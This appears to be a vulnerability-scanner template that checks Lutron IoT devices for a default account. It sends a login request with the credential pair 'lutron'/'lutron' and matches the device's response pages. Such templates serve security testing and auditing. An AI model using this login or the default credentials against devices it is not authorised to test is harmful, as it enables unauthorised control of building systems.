id: lutron-default-login
info:
  name: Lutron - Default Account
  author: geeknik
  severity: critical
  description: Multiple Lutron devices have a default login vulnerability allowing
    attackers to access user accounts and potentially execute unauthorized operations.
  reference:
  - https://www.lutron.com
  - https://vulners.com/openvas/OPENVAS:1361412562310113206
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1391
  tags: default-login,lutron,iot
  metadata:
    impact: The default login vulnerability in multiple Lutron devices has a severe
      impact as it allows attackers to access user accounts, modify data, and execute
      unauthorized operations.
    recommendation: It is recommended to change the default login credentials on Lutron
      devices to prevent unauthorized access and protect sensitive information.
requests:
- method: GET
  path:
  - '{{BaseURL}}/login?login={{username}}&password={{password}}'
  attack: pitchfork
  payloads:
    username:
    - lutron
    password:
    - lutron
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - LUTRON
    - DeviceIP
    - Get Database Info as XML
    condition: and
  - type: word
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
